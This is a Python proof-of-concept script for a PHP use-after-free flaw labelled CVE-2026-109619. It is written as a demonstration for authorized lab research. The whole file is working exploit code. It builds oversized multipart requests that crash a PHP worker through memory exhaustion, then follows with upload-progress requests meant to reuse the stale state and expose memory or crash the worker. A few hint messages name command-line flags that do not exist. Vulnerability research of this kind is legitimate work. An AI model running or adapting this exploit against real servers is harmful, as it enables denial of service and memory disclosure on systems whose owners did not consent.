#!/usr/bin/env python3
"""
CVE-2026-109619 Stale Global State Demonstration

Demonstrates the cross-request stale state condition:
  1. Send a request that triggers a fatal error (OOM) on a worker
  2. Send a follow-up request with upload_progress to the same worker
  3. The upload progress handler may consume stale state from request 1

On an ASAN-instrumented PHP build, this would produce a
heap-use-after-free report. On a production build, effects
range from nothing observable to memory disclosure or crash.

For FPM: success depends on hitting the same worker. With
pm.max_children=1, this is guaranteed. The default pool has
max_children=5, so results are probabilistic.

For authorized security research and local lab use only.
"""

import argparse
import socket
import sys
import time


def send_raw(host, port, data, timeout=10):
    """Send raw HTTP request and return response bytes."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(data)
        resp = b""
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        return str(e).encode()


def parse_response(resp):
    """Extract status line, headers, and body from raw response."""
    if not resp:
        return "no response", {}, b""
    parts = resp.split(b"\r\n\r\n", 1)
    header_block = parts[0]
    body = parts[1] if len(parts) > 1 else b""
    lines = header_block.split(b"\r\n")
    status = lines[0].decode("latin-1", "replace") if lines else "no status"
    headers = {}
    for line in lines[1:]:
        decoded = line.decode("latin-1", "replace")
        if ":" in decoded:
            k, v = decoded.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body


def build_oom_request(host, port, path, session_id, num_fields, field_size):
    """Request 1: Trigger a fatal error (memory exhaustion).
    Uses non-file form fields to bypass max_file_uploads limit."""
    boundary = "----StaleReq1"

    body = b""
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    body += b"stale_trigger\r\n"

    for i in range(num_fields):
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="field{i}"\r\n\r\n'.encode()
        body += (b"X" * field_size) + b"\r\n"

    body += f"--{boundary}--\r\n".encode()

    req = f"POST {path} HTTP/1.1\r\n".encode()
    req += f"Host: {host}:{port}\r\n".encode()
    req += f"Cookie: PHPSESSID={session_id}\r\n".encode()
    req += f"Content-Type: multipart/form-data; boundary={boundary}\r\n".encode()
    req += f"Content-Length: {len(body)}\r\n".encode()
    req += b"Connection: close\r\n\r\n"
    req += body
    return req


def build_progress_request(host, port, path, session_id):
    """Request 2: upload_progress request to consume stale state."""
    boundary = "----StaleReq2"

    body = b""
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    body += b"stale_consumer\r\n"
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="file"; filename="normal.txt"\r\n'
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += b"test_data\r\n"
    body += f"--{boundary}--\r\n".encode()

    req = f"POST {path} HTTP/1.1\r\n".encode()
    req += f"Host: {host}:{port}\r\n".encode()
    req += f"Cookie: PHPSESSID={session_id}\r\n".encode()
    req += f"Content-Type: multipart/form-data; boundary={boundary}\r\n".encode()
    req += f"Content-Length: {len(body)}\r\n".encode()
    req += b"Connection: close\r\n\r\n"
    req += body
    return req


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109619 stale global state demonstration")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8898)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--session-id", default="php2shell-stale")
    ap.add_argument("--delay", type=float, default=0.05,
                    help="Delay between requests in seconds (default: 0.05)")
    ap.add_argument("--attempts", type=int, default=10,
                    help="Number of trigger+consume cycles (default: 10)")
    ap.add_argument("--fields", type=int, default=500,
                    help="Number of form fields in OOM request (default: 500)")
    ap.add_argument("--field-size", type=int, default=65536,
                    help="Size of each field value in bytes (default: 65536)")
    args = ap.parse_args()

    est_kb = (args.fields * args.field_size) // 1024
    print("=" * 60)
    print("CVE-2026-109619 Stale State Demonstration")
    print("=" * 60)
    print()
    print(f"  Target:    http://{args.host}:{args.port}")
    print(f"  Fields:    {args.fields} x {args.field_size}B values (~{est_kb}KB)")
    print(f"  Attempts:  {args.attempts}")
    print(f"  Delay:     {args.delay}s between request pairs")
    print()
    print("[*] Strategy:")
    print("    1. Request A: trigger OOM via large multipart (fatal error)")
    print("    2. Request B: send upload_progress to same worker")
    print("    3. If B hits same worker, upload_progress handler may")
    print("       consume stale decoder state left by A's interrupted cleanup")
    print()

    oom_count = 0
    anomaly_count = 0

    for i in range(1, args.attempts + 1):
        sid_a = f"{args.session_id}-{i}a"
        sid_b = f"{args.session_id}-{i}b"

        req_a = build_oom_request(args.host, args.port, args.path, sid_a,
                                  args.fields, args.field_size)
        req_b = build_progress_request(args.host, args.port, args.path, sid_b)

        print(f"[{i}/{args.attempts}] Phase 1: OOM trigger...", end=" ", flush=True)
        resp_a = send_raw(args.host, args.port, req_a)
        status_a, headers_a, body_a = parse_response(resp_a)

        oom_hit = (b"Allowed memory size" in body_a or
                   b"Fatal error" in body_a or
                   b"500" in resp_a[:30] or
                   not resp_a or len(body_a) == 0)
        if oom_hit:
            oom_count += 1
            print("OOM triggered")
        else:
            print(f"No OOM ({status_a})")

        time.sleep(args.delay)

        print(f"           Phase 2: upload_progress...", end=" ", flush=True)
        resp_b = send_raw(args.host, args.port, req_b)
        status_b, headers_b, body_b = parse_response(resp_b)
        print(status_b)

        # Check for anomalies in response B
        anomalies = []

        # Unexpected PHPSESSID cookie value (memory disclosure indicator)
        cookie_header = headers_b.get("set-cookie", "")
        if "PHPSESSID=" in cookie_header:
            cookie_start = cookie_header.find("PHPSESSID=") + 10
            cookie_end = cookie_header.find(";", cookie_start)
            if cookie_end == -1:
                cookie_end = len(cookie_header)
            cookie_val = cookie_header[cookie_start:cookie_end]
            if cookie_val != sid_b:
                anomalies.append(f"Unexpected PHPSESSID: {cookie_val[:60]}")

        # Error content in what should be a normal response
        if b"Allowed memory size" in body_b:
            anomalies.append("Memory error leaked into Request B")
        if b"Fatal error" in body_b:
            anomalies.append("Fatal error in Request B (stale error state?)")
        if b"Stack trace" in body_b or b"Backtrace" in body_b:
            anomalies.append("Stack trace in Request B")

        # Connection reset (worker crash)
        if b"reset" in resp_b.lower() or not resp_b:
            anomalies.append("Connection reset (worker crash)")

        # Body size anomaly compared to normal phpinfo
        if len(body_b) < 100 and b"200" in resp_b[:30]:
            anomalies.append(f"Abnormally small response body ({len(body_b)} bytes)")

        if anomalies:
            anomaly_count += 1
            for a in anomalies:
                print(f"           [!] {a}")
        print()

    print("=" * 60)
    print("Results")
    print("=" * 60)
    print(f"  OOM triggered:     {oom_count}/{args.attempts}")
    print(f"  Anomalies in B:    {anomaly_count}/{args.attempts}")
    print()
    if oom_count == 0:
        print("[!] OOM never triggered. Increase --parts or --part-size,")
        print("    or lower memory_limit in php.ini.")
    if anomaly_count > 0:
        print("[+] Anomalies detected -- stale state may be leaking across requests.")
    else:
        print("[-] No anomalies detected in Request B responses.")
        print("    This is expected on production builds without ASAN.")
        print("    On ASAN builds, check PHP error log for heap-use-after-free.")
    print()
    print("[*] For deterministic results:")
    print("    - Set pm.max_children=1 in FPM pool config")
    print("    - Or use mod_php (port 8899) where worker reuse is guaranteed")
    print("    - Use ASAN-instrumented PHP for definitive UAF detection")
    return 0


if __name__ == "__main__":
    sys.exit(main())
